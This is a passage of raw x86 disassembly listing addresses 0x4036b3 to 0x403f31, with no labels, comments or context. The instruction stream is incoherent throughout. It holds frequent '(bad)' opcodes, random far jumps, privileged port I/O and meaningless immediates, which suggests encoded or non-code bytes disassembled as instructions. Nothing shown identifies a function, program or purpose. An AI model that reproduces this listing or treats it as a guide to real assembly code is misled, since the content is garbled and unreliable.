  4036b3:	repnz clc 
  4036b5:	leave  
  4036b6:	test   dl,0xbc
  4036b9:	or     eax,0xbce2c8c8
  4036be:	mov    ebp,0xaaeda8cd
  4036c3:	int    0xb5
  4036c5:	mov    ch,0xcc
  4036c7:	jmp    0xbdc3:0xb1eccacf
  4036ce:	(bad)  
  4036cf:	fucomp st(5)
  4036d1:	pop    es
  4036d2:	(bad)  
  4036d3:	(bad)  
  4036d4:	fabs   
  4036d6:	loopne 0x4036b9
  4036d8:	or     ch,cl
  4036da:	loopne 0x4036db
  4036dc:	pop    es
  4036dd:	fmulp  st(7),st
  4036df:	loope  0x4036a1
  4036e1:	sar    BYTE PTR [edi+ebp*8-0x25054c49],0xcb
  4036e9:	mov    ah,0xf9
  4036eb:	jmp    0xe1f6f5ce
  4036f0:	cld    
  4036f1:	(bad)  
  4036f2:	rol    al,1
  4036f4:	(bad)  
  4036f5:	test   al,0xc7
  4036f8:	ror    bh,0xc8
  4036fb:	adc    ecx,DWORD PTR [edi]
  4036fd:	in     al,0xc5
  4036ff:	ret    0xcfc1
  403702:	loop   0x4036d4
  403704:	xlat   BYTE PTR ds:[ebx]
  403705:	mov    bl,0xdb
  403707:	mov    edx,0xdbd2cdf2
  40370c:	repnz cmc 
  40370e:	add    BYTE PTR [eax],al
  403710:	(bad)  
  403711:	shl    ebx,1
  403713:	or     ch,dl
  403715:	retf   
  403716:	hlt    
  403717:	std    
  403718:	mov    esp,0xd812fb0c
  40371d:	(bad)  
  40371f:	fsubp  st(4),st
  403721:	loopne 0x4036da
  403723:	iret   
  403724:	out    dx,al
  403725:	sti    
  403726:	(bad)  
  403728:	aad    0xd0
  40372a:	enter  0xbbf8,0xf7
  40372e:	pop    es
  40372f:	mov    ch,0xd2
  403731:	jecxz  0x40370b
  403733:	fld    QWORD PTR [eax]
  403735:	aam    0xd0
  403737:	(bad)
  40373a:	into   
  40373b:	cld    
  40373c:	jecxz  0x403706
  40373e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40373f:	call   0xf812262b
  403744:	into   
  403745:	icebp  
  403746:	scas   al,BYTE PTR es:[edi]
  403747:	in     al,dx
  403748:	icebp  
  403749:	mov    esi,0xd9f1d4cf
  40374e:	shl    bl,1
  403750:	sar    ch,cl
  403752:	cli    
  403753:	jmp    0x40375a
  403755:	(bad)  
  403757:	(bad)  
  403759:	out    dx,al
  40375a:	iret   
  40375b:	jmp    0xefaf:0xe3b3dcf8
  403762:	mov    al,0xb0
  403764:	hlt    
  403765:	out    dx,eax
  403766:	retf   0xe5ba
  403769:	(bad)  
  40376a:	(bad)  
  40376c:	mov    esp,0xfabcc8c9
  403771:	add    al,0xfb
  403773:	add    al,0x9
  403775:	jecxz  0x40373f
  403777:	cld    
  403778:	sti    
  403779:	cld    
  40377a:	or     bh,cl
  40377c:	out    dx,al
  40377d:	int3   
  40377e:	call   0xd5fd2d72
  403783:	mov    al,0xe8
  403785:	fstp   TBYTE PTR [eax-0x1b150a4b]
  40378b:	fld    QWORD PTR [edx]
  40378d:	xlat   BYTE PTR ds:[ebx]
  40378e:	inc    dl
  403790:	loop   0x403790
  403792:	jecxz  0x403768
  403794:	test   BYTE PTR ds:0xdfd8ddd4,0x2
  40379b:	jecxz  0x403776
  40379d:	int    0xbd
  40379f:	mov    bh,0xd7
  4037a1:	scas   eax,DWORD PTR es:[edi]
  4037a2:	call   0xd1222082
  4037a7:	fcomi  st,st(1)
  4037a9:	fsincos 
  4037ab:	loop   0x40379d
  4037ad:	ror    eax,1
  4037af:	cli    
  4037b0:	int    0xc0
  4037b2:	in     al,dx
  4037b3:	fmulp  st(3),st
  4037b5:	lock lds eax,FWORD PTR ds:0xd3f3cdc4
  4037bc:	add    ecx,ebx
  4037be:	in     al,dx
  4037bf:	vpsubsb ymm5,ymm7,YMMWORD PTR [edx-0x4838281d]
  4037c7:	in     al,dx
  4037c8:	out    0xcc,al
  4037ca:	jmp    0xd11f3ba9
  4037cf:	loope  0x4037d0
  4037d1:	rol    BYTE PTR [esi],1
  4037d3:	aad    0x4
  4037d5:	ret    0xd6de
  4037d8:	out    dx,eax
  4037d9:	out    dx,al
  4037da:	or     cl,cl
  4037dc:	(bad)  
  4037dd:	fucomip st,st(1)
  4037df:	out    0xe3,al
  4037e1:	in     al,0xf1
  4037e3:	rol    edx,0xb0
  4037e6:	cli    
  4037e7:	xabort 0xd2
  4037ea:	mov    dh,0xfe
  4037ec:	mov    edx,0x5c7c8f7
  4037f1:	rol    DWORD PTR [edx],1
  4037f3:	add    eax,0x5c8faf6
  4037f8:	out    dx,eax
  4037f9:	(bad)
  4037fc:	jmp    0x4037dd
  4037fe:	mov    dl,0xec
  403800:	iret   
  403801:	lods   eax,DWORD PTR ds:[esi]
  403802:	(bad)  
  403803:	hlt    
  403804:	repnz int3 
  403806:	out    dx,al
  403807:	in     eax,0xac
  403809:	in     eax,dx
  40380a:	(bad)  
  40380c:	hlt    
  40380d:	fcom   st(5)
  40380f:	add    cl,ah
  403811:	ret    
  403812:	mov    esp,0x8f8eb
  403817:	or     ecx,DWORD PTR [edx]
  403819:	add    eax,0xab0c0704
  40381e:	shr    edx,1
  403820:	fidiv  WORD PTR [ecx-0x3745164b]
  403826:	cmc    
  403827:	icebp  
  403828:	idiv   edx
  40382a:	cmc    
  40382b:	mov    ch,0xea
  40382d:	loopne 0x4037e5
  40382f:	int3   
  403830:	repnz (bad) 
  403832:	(bad)  
  403833:	mov    esp,0xf5defac2
  403838:	or     bh,al
  40383a:	call   0xe0193f38
  40383f:	in     eax,dx
  403840:	mov    bh,0xc7
  403842:	in     eax,dx
  403843:	repnz mov ch,0xc1
  403846:	in     eax,0xcc
  403848:	lods   al,BYTE PTR ds:[esi]
  403849:	mov    eax,0xe3f2b4d4
  40384e:	mov    esi,0xdaccd3dd
  403853:	rcr    bh,cl
  403855:	loope  0x403853
  403857:	mov    ebp,0xd9cee8fb
  40385c:	push   es
  40385d:	ret    0xb2e0
  403860:	out    dx,al
  403861:	retf   0xd1ac
  403864:	(bad)  
  403867:	mov    ecx,0xfbd1c8ea
  40386c:	mov    al,0xe1
  40386e:	icebp  
  40386f:	mov    edi,0xcbbedde5
  403874:	push   es
  403875:	loope  0x403859
  403877:	(bad)  
  403878:	(bad)  
  40387a:	cli    
  40387b:	add    al,0xc8
  40387d:	(bad)
  403880:	in     al,dx
  403881:	scas   eax,DWORD PTR es:[edi]
  403882:	bnd ret 0xd6d5
  403886:	lds    edi,FWORD PTR [edi-0x30a3233]
  40388c:	add    bh,ah
  40388e:	call   0xfd1c3496
  403893:	fadd   DWORD PTR [esi]
  403895:	sti    
  403896:	leave  
  403897:	stc    
  403898:	fld    DWORD PTR ds:0xad0f06ec
  40389e:	jmp    0xb2b2:0xcfb1eff7
  4038a5:	iret   
  4038a6:	in     al,dx
  4038a7:	jmp    0x40385e
  4038a9:	mov    esi,0xdaf8cef5
  4038ae:	into   
  4038af:	repnz into 
  4038b1:	std    
  4038b2:	int3   
  4038b3:	loopne 0x403889
  4038b5:	fcomp  st(5)
  4038b7:	jecxz  0x4038c8
  4038b9:	aad    0xcc
  4038bb:	sti    
  4038bc:	icebp  
  4038bd:	int3   
  4038be:	icebp  
  4038bf:	jmp    0xedb3:0xd6b6eaf7
  4038c6:	lock into 
  4038c8:	fcmovnbe st,st(2)
  4038ca:	clc    
  4038cb:	int3   
  4038cc:	std    
  4038cd:	int    0xd0
  4038cf:	rcl    ebp,cl
  4038d1:	shl    esp,1
  4038d3:	aam    0xdf
  4038d5:	aam    0xe7
  4038d7:	hlt    
  4038d8:	enter  0x508,0xde
  4038dc:	leave  
  4038dd:	fsubr  st(2),st
  4038df:	(bad)
  4038e2:	into   
  4038e3:	int3   
  4038e4:	(bad)  
  4038e5:	ror    ch,cl
  4038e7:	jmp    0xecd8:0xf7cfeabf
  4038ee:	mov    edi,0xe5e0f1d8
  4038f3:	fimul  DWORD PTR [edx]
  4038f5:	loop   0x4038d8
  4038f7:	idiv   dh
  4038f9:	(bad)  
  4038fa:	dec    bl
  4038fc:	fisubr WORD PTR [edx-0xe4c384f]
  403902:	rol    cl,1
  403904:	mov    cl,0xf1
  403906:	mov    eax,0xfde8deb1
  40390b:	sar    DWORD PTR [ebp-0x472f3704],1
  403911:	rol    BYTE PTR [edi],cl
  403913:	loop   0x4038ee
  403915:	fchs   
  403917:	add    al,BYTE PTR [edi]
  403919:	(bad)  
  40391b:	(bad)
  40391f:	ffree  st(6)
  403921:	not    al
  403923:	mov    al,0xc5
  403925:	out    dx,al
  403926:	hlt    
  403927:	in     eax,dx
  403928:	lods   al,BYTE PTR ds:[esi]
  403929:	mov    esi,0xfae8e8fe
  40392e:	(bad)  
  40392f:	jecxz  0x403918
  403931:	in     al,dx
  403932:	in     eax,0xb
  403934:	add    ah,bl
  403936:	add    bl,dl
  403938:	shl    dh,0xee
  40393b:	call   0xc9240926
  403940:	fmulp  st(2),st
  403942:	mov    ah,0xda
  403944:	loopne 0x40393a
  403946:	fistp  QWORD PTR [edx-0x1c324636]
  40394c:	add    edi,ecx
  40394e:	jecxz  0x40390d
  403950:	div    esi
  403952:	aad    0xc4
  403954:	add    eax,0xbc6f7db
  403959:	(bad)  
  40395a:	jmp    0x40393c
  40395c:	pop    es
  40395d:	mov    eax,0xc6d7c2d7
  403962:	loope  0x403946
  403964:	loope  0x40395c
  403966:	scas   al,BYTE PTR es:[edi]
  403967:	int    0xf7
  403969:	stc    
  40396a:	retf   0xeccb
  40396d:	hlt    
  40396e:	sar    DWORD PTR [eax-0x2e3a3f28],1
  403974:	dec    DWORD PTR [ebx]
  403976:	retf   0xdce7
  403979:	add    dh,ch
  40397b:	fmul   st(0),st
  40397d:	shl    DWORD PTR [eax-0x3a541531],cl
  403983:	lods   al,BYTE PTR ds:[esi]
  403984:	loope  0x40393c
  403986:	mov    ch,0xb0
  403988:	retf   
  403989:	mov    edi,0xe3ff03cb
  40398e:	rcl    edi,cl
  403990:	loopne 0x40394d
  403992:	aad    0xe4
  403994:	(bad)  
  403996:	jmp    0x40395c
  403998:	leave  
  403999:	jecxz  0x403968
  40399b:	fsubr  st(6),st
  40399d:	ret    
  40399e:	(bad)  
  40399f:	int    0xde
  4039a1:	jmp    0xfeb4:0xfbd7dbf2
  4039a8:	into   
  4039a9:	into   
  4039aa:	iret   
  4039ab:	sti    
  4039ac:	repz fdivr st,st(1)
  4039af:	rol    ebx,1
  4039b1:	loope  0x40396f
  4039b3:	mov    ecx,0xebcbd0b8
  4039b8:	rol    dh,0xc6
  4039bb:	fstp   st(6)
  4039bd:	(bad)  
  4039be:	mov    al,0xb7
  4039c0:	mov    al,0xdc
  4039c2:	call   0xe4f511bc
  4039c7:	in     eax,0xf9
  4039c9:	repnz mov ebp,0xdebfd2f4
  4039cf:	add    esp,edx
  4039d1:	(bad)  
  4039d2:	out    0xdb,eax
  4039d4:	not    ch
  4039d6:	call   0xf84d03da
  4039db:	clc    
  4039dc:	iret   
  4039dd:	stos   BYTE PTR es:[edi],al
  4039de:	mov    dl,0xde
  4039e0:	(bad)  
  4039e1:	fucomp st(4)
  4039e3:	iret   
  4039e4:	stc    
  4039e5:	ror    edi,cl
  4039e7:	mov    al,0xf6
  4039e9:	stc    
  4039ea:	jmp    0xe6fa:0xd3e0ccd8
  4039f1:	ret    
  4039f2:	fdiv   st,st(3)
  4039f4:	in     al,0xd1
  4039f6:	cmc    
  4039f7:	mul    bh
  4039f9:	out    0x0,eax
  4039fb:	sar    edi,0xe9
  4039fe:	loop   0x4039a9
  403a00:	imul   ch
  403a02:	loope  0x4039e7
  403a04:	in     eax,0xc6
  403a06:	(bad)  
  403a07:	enter  0xb4cc,0xbc
  403a0b:	div    ecx
  403a0d:	out    dx,eax
  403a0e:	int3   
  403a0f:	out    0xdf,al
  403a11:	loopne 0x4039f8
  403a13:	cld    
  403a14:	xlat   BYTE PTR ds:[ebx]
  403a15:	aam    0x7
  403a17:	fadd   QWORD PTR ds:0xf812ea0b
  403a1d:	mov    edi,0xf1c2cee7
  403a22:	(bad)  
  403a23:	out    dx,al
  403a24:	hlt    
  403a25:	fdiv   st,st(7)
  403a27:	in     al,0xfb
  403a29:	mov    ebp,0xd8f9beb8
  403a2e:	sar    cl,cl
  403a30:	lock (bad) 
  403a32:	out    0xd0,eax
  403a34:	out    0xdc,eax
  403a36:	jmp    0xd232435
  403a3b:	add    al,0xc0
  403a3d:	out    dx,al
  403a3e:	in     al,dx
  403a3f:	(bad)  
  403a40:	xlat   BYTE PTR ds:[ebx]
  403a41:	loope  0x403a2e
  403a43:	jmp    0x403a3b
  403a45:	(bad)  
  403a46:	shl    edx,cl
  403a48:	lock mov edx,0xe1d6bab6
  403a4e:	out    dx,al
  403a4f:	fcomi  st,st(0)
  403a51:	mov    edi,0xf1eaeafc
  403a56:	(bad)  
  403a58:	stc    
  403a59:	jmp    0x403a65
  403a5b:	retf   
  403a5c:	out    0xdc,al
  403a5e:	mov    eax,0xe9ecc0be
  403a63:	in     eax,dx
  403a64:	hlt    
  403a65:	jmp    0xd8d3:0xf6dbe8c0
  403a6c:	call   0xcc423b61
  403a71:	stc    
  403a72:	neg    ebp
  403a74:	add    edx,esi
  403a76:	fiadd  DWORD PTR [ecx+eax*1]
  403a79:	retf   
  403a7a:	stc    
  403a7b:	in     al,0xe7
  403a7d:	shr    bl,0xef
  403a80:	(bad)  
  403a82:	lock vpsubd xmm6,xmm4,xmm4
  403a87:	icebp  
  403a88:	mov    edx,0xf4d3f3fd
  403a8d:	sar    BYTE PTR [esi+eax*1-0x1081804],cl
  403a94:	(bad)
  403a97:	fucomp st(3)
  403a99:	jmp    0xbe1f2577
  403a9e:	xlat   BYTE PTR ds:[ebx]
  403a9f:	jecxz  0x403a90
  403aa1:	leave  
  403aa2:	mov    ah,0xcd
  403aa4:	(bad)  
  403aa5:	div    DWORD PTR [ebx+edi*8-0x28321318]
  403aac:	jmp    0xdf113669
  403ab1:	neg    ecx
  403ab3:	les    eax,FWORD PTR [eax]
  403ab5:	sar    cl,0xff
  403ab8:	push   cs
  403ab9:	out    dx,eax
  403aba:	lds    ecx,FWORD PTR [eax]
  403abc:	or     esp,ecx
  403abe:	in     eax,dx
  403abf:	(bad)
  403ac2:	fld    TBYTE PTR [ecx-0xd4f1e0b]
  403ac8:	stc    
  403ac9:	aad    0xc9
  403acb:	leave  
  403acc:	ret    0xf3fc
  403acf:	fndisi(8087 only) 
  403ad1:	hlt    
  403ad2:	ret    0x304
  403ad5:	retf   
  403ad6:	cld    
  403ad7:	enter  0xc807,0xe8
  403adb:	int3   
  403adc:	les    edi,FWORD PTR [ebp-0x1250434f]
  403ae2:	cmc    
  403ae3:	out    dx,eax
  403ae4:	retf   0xb1e7
  403ae7:	cli    
  403ae8:	mov    esi,0xd9d7e9ba
  403aed:	stc    
  403aee:	add    ah,dh
  403af0:	(bad)  
  403af1:	icebp  
  403af2:	shl    edx,1
  403af4:	(bad)  
  403af5:	(bad)  
  403af7:	or     al,al
  403af9:	in     eax,0xca
  403afb:	retf   
  403afc:	adc    ch,BYTE PTR [eax-0x36193f13]
  403b02:	sti    
  403b03:	mov    bh,0xf0
  403b05:	aad    0xea
  403b07:	repnz fucomi st,st(5)
  403b0a:	mov    esi,0xbcdde8cd
  403b0f:	ret    0x7c7
  403b12:	mov    edx,0xf5e2f7c7
  403b17:	(bad)  
  403b18:	loopne 0x403b1d
  403b1a:	in     al,dx
  403b1b:	fcmovnu st,st(4)
  403b1d:	jecxz  0x403b04
  403b1f:	loope  0x403ade
  403b21:	mov    ch,0xe5
  403b23:	(bad)  
  403b24:	out    0xeb,al
  403b26:	in     eax,0xd0
  403b28:	les    esi,FWORD PTR [ebp-0x16fe2418]
  403b2e:	(bad)  
  403b30:	cli    
  403b31:	dec    BYTE PTR [ebx]
  403b33:	fld    DWORD PTR [edi+eax*1]
  403b36:	call   0x9413e46
  403b3b:	or     eax,0xafafdfde
  403b40:	(bad)  
  403b41:	int    0xad
  403b43:	fcmovbe st,st(0)
  403b45:	(bad)  
  403b46:	repz mov bh,0xea
  403b49:	fbstp  TBYTE PTR [ebp-0x18060b14]
  403b4f:	fadd   DWORD PTR ds:0xf7e3e400
  403b55:	loopne 0x403b53
  403b57:	loop   0x403b4e
  403b59:	into   
  403b5a:	in     al,dx
  403b5b:	in     al,dx
  403b5c:	push   es
  403b5d:	ret    0xaeb8
  403b60:	jmp    0xc6e5:0xc0e1c2c3
  403b67:	(bad)  
  403b68:	in     al,0xd9
  403b6a:	mov    ebx,0xfffdbaf2
  403b6f:	fnstsw ax
  403b71:	cld    
  403b72:	ret    
  403b73:	clc    
  403b74:	jmp    0xea1f335c
  403b79:	fsubr  st,st(7)
  403b7b:	cli    
  403b7c:	repnz int 0xb0
  403b7f:	shl    esi,cl
  403b81:	mov    ebp,0xe1bab4c3
  403b86:	fnstenv [ebp-0x10100a3c]
  403b8c:	jmp    0xf4192b63
  403b91:	ret    0xf0ff
  403b94:	hlt    
  403b95:	retf   
  403b96:	push   es
  403b97:	retf   0xd4f5
  403b9a:	clc    
  403b9b:	call   0xf72a1cb3
  403ba0:	mov    al,0xc6
  403ba2:	icebp  
  403ba3:	mov    dh,0xd9
  403ba5:	fld1   
  403ba7:	out    dx,al
  403ba8:	push   ebx
  403baa:	mov    ebx,0xba0301e9
  403baf:	mov    esi,0xe0d4e6d1
  403bb4:	(bad)  
  403bb5:	xlat   BYTE PTR ds:[ebx]
  403bb6:	out    0xe6,eax
  403bb8:	pop    es
  403bb9:	fimul  DWORD PTR [edi]
  403bbb:	in     al,dx
  403bbc:	adc    bh,BYTE PTR [esi-0x4d231d1d]
  403bc2:	out    0xd6,al
  403bc4:	aad    0xb6
  403bc6:	ror    dl,1
  403bc8:	(bad)  
  403bc9:	repnz into 
  403bcb:	retf   0xc1ea
  403bce:	loope  0x403bd7
  403bd0:	mul    ebp
  403bd2:	add    eax,0xe5d5f8e4
  403bd7:	(bad)  
  403bd8:	or     esp,edi
  403bda:	(bad)  
  403bdb:	loop   0x403bd5
  403bdd:	jecxz  0x403bc8
  403bdf:	xlat   BYTE PTR ds:[ebx]
  403be0:	out    dx,al
  403be1:	into   
  403be2:	mov    ch,0xe1
  403be4:	shl    edi,1
  403be6:	aad    0xef
  403be8:	fstp   TBYTE PTR [ebx-0x2e02282a]
  403bee:	mul    edx
  403bf0:	fsubp  st(4),st
  403bf2:	mov    edx,0xdbffe7e7
  403bf7:	out    dx,al
  403bf8:	iret   
  403bf9:	(bad)  
  403bfa:	call   0xdf2628d8
  403bff:	ret    0xc8f3
  403c02:	repnz lock retf 
  403c05:	out    0xed,eax
  403c07:	in     al,dx
  403c08:	jmp    0xdf3305d9
  403c0d:	(bad)  
  403c0f:	ret    0xc2db
  403c12:	pop    es
  403c13:	jmp    0x7e3:0xdfe1fceb
  403c1a:	stc    
  403c1b:	fisttp DWORD PTR [ebx]
  403c1d:	call   0xe8371a09
  403c22:	ror    cl,cl
  403c24:	(bad)  
  403c26:	mov    ch,0xfa
  403c28:	lock cmc 
  403c2a:	call   0xd03a340e
  403c2f:	cli    
  403c30:	(bad)  
  403c31:	std    
  403c32:	add    edi,esi
  403c34:	add    BYTE PTR [eax],al
  403c36:	out    0xf5,al
  403c38:	mov    esp,0xeae013e7
  403c3d:	out    0xdd,al
  403c3f:	enter  0xe6cf,0xaa
  403c43:	test   eax,0xd3d0ecf9
  403c48:	in     al,dx
  403c49:	(bad)  
  403c4a:	std    
  403c4b:	fucomi st,st(0)
  403c4d:	idiv   edi
  403c4f:	mov    ebp,0x2fbc2d8
  403c54:	mov    eax,0xf4e602c5
  403c59:	add    al,0xce
  403c5b:	rol    DWORD PTR [esi],0xd1
  403c5e:	rcr    bh,1
  403c60:	repnz sar ebx,0xe5
  403c64:	mov    ah,0xf1
  403c66:	int    0xe9
  403c68:	iret   
  403c69:	sar    BYTE PTR [esi-0x708250e],cl
  403c6f:	ret    
  403c70:	mov    edi,0xff05dbbf
  403c75:	fstp   st(1)
  403c77:	fyl2xp1 
  403c79:	retf   0xfbdf
  403c7c:	adc    ch,cl
  403c7e:	rol    bl,1
  403c80:	mov    esp,0xd6b1c9f4
  403c86:	ror    ebx,cl
  403c88:	in     al,0xf0
  403c8a:	les    edi,FWORD PTR [edi-0x2d122d30]
  403c90:	cmc    
  403c91:	sar    dl,0xe2
  403c94:	(bad)  
  403c95:	std    
  403c96:	xlat   BYTE PTR ds:[ebx]
  403c97:	sti    
  403c98:	add    eax,0x8ccde01
  403c9d:	fsubr  QWORD PTR [eax-0x3b2f3b09]
  403ca3:	jmp    0x403c5c
  403ca5:	loopne 0x403c70
  403ca7:	cli    
  403ca8:	hlt    
  403ca9:	(bad)  
  403caa:	lock (bad) 
  403cad:	out    dx,eax
  403cae:	(bad)  
  403cb0:	(bad)  
  403cb1:	hlt    
  403cb2:	out    0xe3,al
  403cb4:	cli    
  403cb5:	rcl    bh,0x7
  403cb8:	fld1   
  403cba:	int3   
  403cbb:	fild   WORD PTR ds:0xd3efddb2
  403cc1:	retf   0xd7c2
  403cc4:	jmp    0xdf0e0782
  403cc9:	xlat   BYTE PTR ds:[ebx]
  403cca:	(bad)  
  403ccc:	mov    esp,0xbffcbccc
  403cd1:	rol    bh,cl
  403cd3:	fcom   st(6)
  403cd5:	cmc    
  403cd6:	mov    ebp,0xcbfdfe0a
  403cdc:	(bad)  
  403cdd:	mov    bl,0xdf
  403cdf:	lds    esi,FWORD PTR [esi-0xf16374d]
  403ce5:	out    0xd3,al
  403ce7:	(bad)
  403cea:	std    
  403ceb:	fucomp st(7)
  403ced:	out    dx,eax
  403cee:	mov    edx,0xfdfef0d6
  403cf3:	loope  0x403cf1
  403cf5:	jecxz  0x403cf7
  403cf7:	or     bl,ah
  403cf9:	out    dx,al
  403cfa:	or     eax,0xebde07c9
  403cff:	mov    cl,0xf7
  403d01:	shr    BYTE PTR [ebx+esi*8-0x2d0c2e3e],1
  403d08:	cmc    
  403d09:	jmp    0x403ccf
  403d0b:	jmp    0x403cc1
  403d0d:	mov    eax,0x7f6ffd8
  403d12:	out    0xfe,al
  403d14:	neg    al
  403d16:	std    
  403d17:	(bad)  
  403d18:	in     eax,dx
  403d19:	aad    0xe
  403d1b:	(bad)  
  403d1c:	(bad)  
  403d1e:	mov    cl,0xe8
  403d20:	div    al
  403d22:	(bad)  
  403d23:	mov    ah,0xda
  403d25:	fxch   st(4)
  403d27:	fdivr  DWORD PTR [edi-0x935022a]
  403d2d:	aad    0xe2
  403d2f:	add    bh,BYTE PTR [ebp+0x302d804]
  403d35:	rol    esi,1
  403d37:	out    0x4,al
  403d39:	(bad)  
  403d3a:	jmp    0x403d0f
  403d3c:	(bad)  
  403d3d:	iret   
  403d3e:	out    dx,al
  403d3f:	iret   
  403d40:	int3   
  403d41:	in     eax,0xc3
  403d43:	mov    bl,0xd1
  403d45:	call   0xbe2e191f
  403d4a:	repnz cld 
  403d4c:	(bad)  
  403d4e:	bnd ret 0xd3fb
  403d52:	fdiv   st,st(1)
  403d54:	fsub   st(1),st
  403d56:	add    dh,dh
  403d58:	(bad)  
  403d59:	dec    esi
  403d5b:	(bad)  
  403d5d:	mov    edi,0xc2d0d3b3
  403d63:	loop   0x403d3f
  403d65:	out    dx,eax
  403d66:	sti    
  403d67:	mov    bh,0xf2
  403d69:	fcomi  st,st(6)
  403d6b:	add    edi,DWORD PTR [ebx-0x283f0726]
  403d71:	sti    
  403d72:	fst    st(1)
  403d74:	(bad)  
  403d75:	stc    
  403d76:	or     esp,edi
  403d78:	(bad)  
  403d79:	or     eax,0xc5080809
  403d7e:	call   0xaf10f542
  403d83:	test   eax,0xebffe0cf
  403d88:	mov    esi,0xdde8e3e9
  403d8d:	iret   
  403d8e:	fldz   
  403d90:	mov    esp,0xe0cbd1df
  403d95:	or     BYTE PTR [eax*1-0x5213622],al
  403d9c:	adc    dh,dl
  403d9e:	shr    DWORD PTR [ecx-0x1e4e1f09],cl
  403da4:	(bad)  
  403da5:	xlat   BYTE PTR ds:[ebx]
  403da6:	cmc    
  403da7:	sti    
  403da8:	cmc    
  403da9:	stc    
  403daa:	mov    eax,0xe1effcef
  403daf:	inc    DWORD PTR [esi]
  403db1:	(bad)  
  403db3:	cmc    
  403db4:	in     eax,0x7
  403db6:	(bad)  
  403db7:	stc    
  403db8:	fiadd  DWORD PTR [edi+edi*8]
  403dbb:	push   cs
  403dbc:	leave  
  403dbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dbe:	repz rol ch,1
  403dc1:	lods   al,BYTE PTR ds:[esi]
  403dc2:	out    0xf4,eax
  403dc4:	test   ah,0xb6
  403dc7:	sti    
  403dc8:	(bad)  
  403dca:	mov    ch,0xe9
  403dcc:	(bad)  
  403dce:	dec    ch
  403dd0:	push   es
  403dd1:	add    eax,0x1ca06be
  403dd6:	jmp    0x143e14b7
  403ddb:	loopne 0x403de3
  403ddd:	out    dx,al
  403dde:	rcl    ecx,cl
  403de0:	retf   0xd6b7
  403de3:	iret   
  403de4:	stc    
  403de5:	(bad)  
  403de6:	iret   
  403de7:	in     al,dx
  403de8:	(bad)
  403deb:	(bad)  
  403dec:	out    dx,eax
  403ded:	add    ebp,ebp
  403def:	out    dx,al
  403df0:	loop   0x403db7
  403df2:	(bad)  
  403df3:	aam    0xc1
  403df5:	stc    
  403df6:	retf   0xc0d6
  403df9:	loop   0x403df4
  403dfb:	adc    al,BYTE PTR [ebx]
  403dfd:	lock (bad) 
  403dff:	leave  
  403e00:	loop   0x403de9
  403e02:	loopne 0x403db5
  403e04:	cli    
  403e05:	sar    eax,cl
  403e07:	cli    
  403e08:	repnz cld 
  403e0a:	in     al,0xf0
  403e0c:	fcomp  st(5)
  403e0e:	mov    esi,0x6e5fad4
  403e13:	out    0x6,eax
  403e15:	(bad)  
  403e16:	(bad)  
  403e17:	(bad)  
  403e19:	add    ah,bl
  403e1b:	fld    QWORD PTR [edi]
  403e1d:	in     al,dx
  403e1e:	loopne 0x403dd1
  403e20:	mov    bl,0xf0
  403e22:	jmp    0x403e1e
  403e24:	fldl2t 
  403e26:	mov    eax,0xb4b8c6df
  403e2b:	fucomp st(5)
  403e2d:	sar    ecx,0x1
  403e30:	fcmovnbe st,st(0)
  403e32:	push   es
  403e33:	repz clc 
  403e35:	shl    cl,0x7
  403e38:	imul   al
  403e3a:	inc    DWORD PTR ds:0xeae8acee
  403e40:	lds    edi,FWORD PTR [esi+ebp*4-0xe17281c]
  403e47:	mov    ebx,0xb1d2ccd6
  403e4c:	shr    cl,1
  403e4e:	pop    es
  403e4f:	rol    DWORD PTR [edi],0xd4
  403e52:	int3   
  403e53:	hlt    
  403e54:	loope  0x403e1c
  403e56:	enter  0xe7c9,0xea
  403e5a:	out    0xd3,al
  403e5c:	in     al,0xb8
  403e5e:	jmp    0xf714f016
  403e63:	mov    dh,0xf6
  403e65:	fptan  
  403e67:	int3   
  403e68:	hlt    
  403e69:	(bad)  
  403e6b:	fdiv   st(3),st
  403e6d:	enter  0xe3d7,0xec
  403e71:	ror    DWORD PTR [ebx],0xe3
  403e74:	(bad)  
  403e76:	add    edx,esi
  403e78:	add    bl,al
  403e7a:	fcmovnu st,st(3)
  403e7c:	clc    
  403e7d:	rcr    esi,cl
  403e7f:	mov    esi,0xeaccbcac
  403e84:	(bad)  
  403e85:	out    dx,al
  403e86:	(bad)  
  403e87:	call   0xe4322371
  403e8c:	add    bh,BYTE PTR [edi-0x3d0238f9]
  403e92:	rol    esi,1
  403e94:	add    eax,0xe4dbdbe6
  403e99:	lds    eax,FWORD PTR [edx]
  403e9b:	(bad)  [esi]
  403e9d:	icebp  
  403e9e:	les    ebp,FWORD PTR [esi+ebp*4-0x360d4f36]
  403ea5:	mov    dh,0xb2
  403ea7:	in     eax,dx
  403ea8:	mov    ch,0xcd
  403eaa:	fsub   st(7),st
  403eac:	mov    edx,0xcccedcfc
  403eb1:	std    
  403eb2:	fxch   st(3)
  403eb4:	cmc    
  403eb5:	add    eax,0xaef0ed0
  403eba:	pop    es
  403ebb:	clc    
  403ebc:	int    0xd0
  403ebe:	jmp    0x403ea3
  403ec0:	retf   
  403ec1:	mov    ch,0xb3
  403ec3:	out    0xed,eax
  403ec5:	int3   
  403ec6:	(bad)  
  403ec7:	mov    edi,0xfcdabdd5
  403ecc:	add    ebp,ecx
  403ece:	lock mov eax,0xf807bd05
  403ed4:	shl    ecx,1
  403ed6:	pop    es
  403ed7:	jecxz  0x403ee3
  403ed9:	in     al,0xff
  403edb:	sti    
  403edc:	or     eax,0xd2eae8d9
  403ee1:	scas   al,BYTE PTR es:[edi]
  403ee2:	out    dx,eax
  403ee3:	repz fcmovnbe st,st(5)
  403ee6:	cmc    
  403ee7:	out    0xbb,al
  403ee9:	in     eax,0xff
  403eeb:	jmp    0xe7ec:0xf8f1ccda
  403ef2:	pop    es
  403ef3:	aad    0xe1
  403ef5:	leave  
  403ef6:	jmp    0xc4c1:0xdffd0ac9
  403efd:	in     eax,dx
  403efe:	out    dx,al
  403eff:	lock fidiv WORD PTR [eax-0x1935371a]
  403f06:	enter  0xf2b6,0xd8
  403f0a:	jmp    0xe1b9:0xf1f6dadf
  403f11:	mov    esp,0xe4ebfbf4
  403f16:	(bad)  
  403f18:	(bad)  
  403f1a:	cld    
  403f1b:	or     ecx,esp
  403f1d:	ret    0xd7aa
  403f20:	mov    bh,0xb5
  403f22:	cmc    
  403f23:	ret    
  403f24:	mov    bh,0xc8
  403f26:	fxch   st(6)
  403f28:	out    dx,eax
  403f29:	int    0xb6
  403f2b:	sar    esi,1
  403f2d:	jecxz  0x403f06
  403f2f:	aam    0xb4
  403f31:	repnz mov esp,0xebd5d5f5
